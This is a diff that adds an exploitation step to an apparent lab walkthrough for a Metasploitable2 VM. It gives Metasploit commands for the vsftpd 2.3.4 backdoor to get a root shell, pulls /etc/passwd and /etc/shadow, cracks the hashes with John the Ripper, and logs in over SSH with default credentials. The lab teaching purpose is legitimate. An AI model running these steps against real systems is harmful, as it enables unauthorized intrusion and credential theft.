@@ -68,3 +68,84 @@ vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
 This is **CVE-2011-2523**, you can google it up. This vulnerability is a backdoor that opens a shell on port 6200/tcp, allowing unauthorized access to affected systems. The backdoor script activate if you type in ```:)``` at the end of your username when authenticating, just like this: ```username:)```. I highly reccomend you to google all these vulnerabilities, because it's essential to also know why what we are trying to exploit is broken. 
 
 Browser prompt: **CVE [service] [version]**
+
+## Step 4 - Exploitation 
+
+Now we will exploit each one of these vulnerabilities. We will start off with ```vsftpd```. 
+
+### 4a - vsftpd 2.3.4 
+In Kali run:
+```bash 
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <target-ip> (metaspoitable VM) 
+set LHOST <attacker-ip> (kali VM) 
+show options
+exploit
+```
+
+Now we have gained access to ```meterpreter```, which basically means we now have a Unix command shell as **root.** To check that, run following commands: 
+```bash
+shell
+whoami (The response should be root)
+```
+
+Now you can do a lot of interesting things, we will pull the passwords and crack them with John the Ripper. 
+
+In meterpreter run: 
+
+```bash
+download /etc/passwd (pulls passwords)
+download /etc/shadow (pulls hashes)
+```
+
+From another Kali terminal crack passwords
+
+```bash
+unshadow /home/kali/passwd /home/kali/shadow > /home/kali/cracked.txt
+cat /home/kali/cracked.txt
+```
+
+**cracked.txt** should be something like that: 
+```bash 
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+```
+
+Run John: 
+
+```bash
+john /home/kali/cracked.txt
+
+OR if john is slow: 
+
+# rockyou ships compressed on Kali, decompress once:
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# then point john at it:
+john --wordlist=/usr/share/wordlists/rockyou.txt /root/cracked.txt
+```
+
+It will take some time, but now we have passwords: 
+```bash
+john --show /home/kali/cracked.txt
+```
+
+Next step is to connect with SSH: 
+```bash
+ssh msfadmin@<target-ip> // password: msfadmin 
+ssh postgres@<target-ip> // password: postgres
+ssh user@<target-ip> // password: user 
+```
+
+Now we have SSH for almost every running service. You may also run into an error like this when running ```ssh``` commands:
+```bash
+Unable to negotiate with <target-ip> on port 22: no matching host key type found.
+```
+
+It is caused because Metaspoitable2 runs on 2010 OpenSSH server and Kali is on the new one. The **fix** would be to allow old OpenSSH algorithms.
+
+```bash
+ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@<target-ip>
+```
